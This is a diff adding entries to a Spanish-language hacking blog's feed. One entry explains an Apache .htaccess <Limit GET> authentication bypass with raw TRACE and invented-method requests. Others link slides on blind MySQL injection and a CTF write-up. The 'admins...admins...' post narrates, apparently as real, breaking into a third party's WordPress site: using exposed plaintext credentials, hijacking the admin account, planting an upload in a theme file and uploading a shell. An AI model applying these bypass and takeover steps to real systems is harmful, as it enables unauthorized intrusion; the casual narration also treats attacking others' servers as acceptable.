+<p>Resumen: El servidor le aplica un hash al password antes de ser enviado.</p>
+
+<p>En la siguiente imagen podemos encontrar un servidor que implementa un certificado de tipo basico.</p>
+
+<p><img src="http://i.imgur.com/jJOj8.png"></p>
+
+<p>Conociendo la cantidad de admins que andan sueltos, Podriamos deducir para suerte nuestra que nos estariamos encontrando con un .htaccess configurado de la siguiente manera (supongamos).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>AuthUserFile .htpasswd
+</span><span class='line'>AuthName "Area Radioactiva"
+</span><span class='line'>AuthType Basic
+</span><span class='line'> 
+</span><span class='line'>&lt;Limit GET>
+</span><span class='line'>require valid-user
+</span><span class='line'>&lt;/Limit></span></code></pre></td></tr></table></div></figure>
+
+
+<p>Donde esta la mala implementacion?</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;Limit GET></span></code></pre></td></tr></table></div></figure>
+
+
+<p>Vemos que solo se limita a peticiones GET, dejando de lado TRACE, OPTIONS, POST, PUT, COPY, MOVE, DELETE, TRACK, etc, entre otras.</p>
+
+<p>Podriamos obtener el contenido de algun fichero detras de la proteccion utilizando el metodo POST.</p>
+
+<p><img src="http://i.imgur.com/Yy4KK.png"></p>
+
+<p>Otras configuraciones mas restringidas incluyen el metodo POST como limite.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>AuthUserFile .htpasswd
+</span><span class='line'>AuthName "Area Radioactiva"
+</span><span class='line'>AuthType Basic
+</span><span class='line'> 
+</span><span class='line'>&lt;Limit GET POST>
+</span><span class='line'>require valid-user
+</span><span class='line'>&lt;/Limit></span></code></pre></td></tr></table></div></figure>
+
+
+<p>Pero eso no nos niega la posibilidad de enumerar los ficheros y directorios protegidos por .htaccess utilizando los demas metodos que se hayen habilitados en el servidor.</p>
+
+<p>Si analizamos, ahun existiendo o no el path /files/pass.txt, el servidor nos responderia con el mismo error 401 (no autorizado)</p>
+
+<p><img src="http://i.imgur.com/NG8WN.png"></p>
+
+<p>Lo mismo pasara al realizar una peticion POST, pero que hay de los demas metodos, como responderia ante una peticion http que no este dentro de los <Limit> ? por ejemplo TRACE.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>TRACE /files/pass.txt HTTP/1.0
+</span><span class='line'> 
+</span><span class='line'>HTTP/1.0 200 ok
+</span><span class='line'>Date: Thu, 05 Jul 2012 10:53:32 GTM
+</span><span class='line'>Server: Apache /2.2.3 (centOS)
+</span><span class='line'>Connection: close
+</span><span class='line'>Content-type: message/http
+</span><span class='line'>TRACE /files/pass.txt HTTP/1.0</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Evidentemente nos responde con 200 ok, hemos logrado evadir la restriccion del .htaccess para deducir la existencia del fichero en el servidor, en caso de no existir el servidor nos responderia con un error 404.</p>
+
+<p>Otro manera seria realizar peticiones con metodos no implementados e inexistentes como GETS, el servidor lo tomaria como si se tratara de un metodo GET.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>GETS /files/pass.txt HTTP/1.1
+</span><span class='line'> 
+</span><span class='line'>HTTP/1.0 200 ok
+</span><span class='line'>Date: Thu, 05 Jul 2012 10:53:32 GTM
+</span><span class='line'>Server: Apache /2.2.3 (centOS)
+</span><span class='line'>Connection: close
+</span><span class='line'>Content-type: message/http</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Este tipo de evaciones lo implementa la herramientas HTexploit.</p>
+
+<p><img src="http://i.imgur.com/qsBVV.png"></p>
+
+<p>Saludos!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Tecnicas De Blind Mysql Injection]]></title>
+    <link href="http://q3rv0.github.io/blog/2014/11/17/tecnicas-de-blind-mysql-injection/"/>
+    <updated>2014-11-17T08:41:03+06:30</updated>
+    <id>http://q3rv0.github.io/blog/2014/11/17/tecnicas-de-blind-mysql-injection</id>
+    <content type="html"><![CDATA[<p>Hola como estan todos!? este es un nuevo pdf en el que pretendo desarrollar de manera sencilla y entendible dos tecnicas de inyeccion a ciegas en base de datos Mysql, por un lado me gustaria comenzar a hacer un corto repaso de la tecnica “binary search” que es comunmente las mas usada y conocida para realizar este tipo de ataques<!--more-->, despues pasar a lo que es el metodo “Bit Shifting” y por ultimo culminar con otro metodo que hace uso de la funcion FIND_IN_SET().</p>
+
+<p>Disfruten el documento :)</p>
+
+<iframe src="http://www.slideshare.net/slideshow/embed_code/13796822" width="595" height="446" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC;border-width:1px 1px 0;margin-bottom:5px" allowfullscreen></iframe>
+
+
+<p></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Resultado Del LAMPSecurity:CTF 6 Challenge]]></title>
+    <link href="http://q3rv0.github.io/blog/2014/11/17/resultado-del-lampsecurity-ctf-6-challenge/"/>
+    <updated>2014-11-17T08:30:28+06:30</updated>
+    <id>http://q3rv0.github.io/blog/2014/11/17/resultado-del-lampsecurity-ctf-6-challenge</id>
+    <content type="html"><![CDATA[<p>Hace aproximadamente una semana, la comunidad sec-track en asociacion con hacklabs, lanzo un reto, medio viejito ya, que consistia en encontrar una nueva manera de penetrar en el entorno virtual LAMPSecurity CTF 6, el ganadaor del laboratorio resulto ser killr00t con una intrucion que no me convencio mucho ya que buscando encontre algo parecido ¬¬<!--more-->.</p>
+
+<p>Pero lo felicito de igual manera…y les dejo el solucionario que realize y envie, salvo que no logre conseguir acceso como usuario root en el sistema :(</p>
+
+<p>Me pregunto que hubiera pasado con el resultado si hubiera rooteado?…</p>
+
+<p>opinen…</p>
+
+<iframe src="http://www.slideshare.net/slideshow/embed_code/13458882" width="595" height="446" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC;border-width:1px 1px 0;margin-bottom:5px" allowfullscreen></iframe>
+
+
+<p></p>
+
+<p>Y por aca les dejo el de Killr00t</p>
+
+<p><a href="http://issuu.com/elhacklab/docs/lampsecurity_ctf6_pentest_killr00t_sec-track?e=0">http://issuu.com/elhacklab/docs/lampsecurity_ctf6_pentest_killr00t_sec-track?e=0</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[admins...admins...]]></title>
+    <link href="http://q3rv0.github.io/blog/2014/11/17/admins-dot-dot-dot-admins-dot-dot-dot/"/>
+    <updated>2014-11-17T08:25:26+06:30</updated>
+    <id>http://q3rv0.github.io/blog/2014/11/17/admins-dot-dot-dot-admins-dot-dot-dot</id>
+    <content type="html"><![CDATA[<p>Siempre antes de realizar un análisis de puertos y servicios en el servidor, siempre antes que revisar cualquier punto de ataque, estoy acostumbrado a indagar sobre los distintos tipos de archivos que pueda albergar la aplicación en la zona pública: <em>.xls, </em>.sql, <em>docx, </em>.txt, <em>.jsp, </em>.php, etc.<!--more--></p>
+
+<p>Hay ciertas ocaciones en las que uno se encuentra con este tipo de cosas…</p>
+
+<p><img src="http://i.imgur.com/JGX89.png"></p>
+
+<p>WTF!!? además de que los passwords están en texto plano!, estás son las cosas por las que me preguntó ¿por que hay cada admin tan pelotudo?
+Rápidamente me hago con el phpmyadmin</p>
+
+<p><img src="http://i.imgur.com/RzSxb.png"></p>
+
+<p>Y viendo los nombres de las tablas deduzco que se trata de una aplicación que utiliza un CMS wordpress, tranquilamente podría subir una shell desde aquí pero mi intención es secuestrar el WP así que edito la tabla wp_users para cambiar el hash del admin por otro generado a mi antojo, listo ya  estoy dentro del panel.</p>
+
+<p><img src="http://i.imgur.com/fR9eo.png"></p>
+
+<p>Debido a las restricciones de subida, además de no poder realizar un bypass, opto por editar uno de los ficheros del theme comments.php para insertar un upload</p>
+
+<p><img src="http://i.imgur.com/hSkne.png"></p>
+
+<p><img src="http://i.imgur.com/jKggP.png"></p>
+
+<p><img src="http://i.imgur.com/Gm600.png"></p>
+
+<p>Subo la shell y ahora solo me queda realizar un análisis de post explotación en el Debian 5.0 y encontrar alguna manera de elevar privilegios.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Backdoor via Inyeccion]]></title>
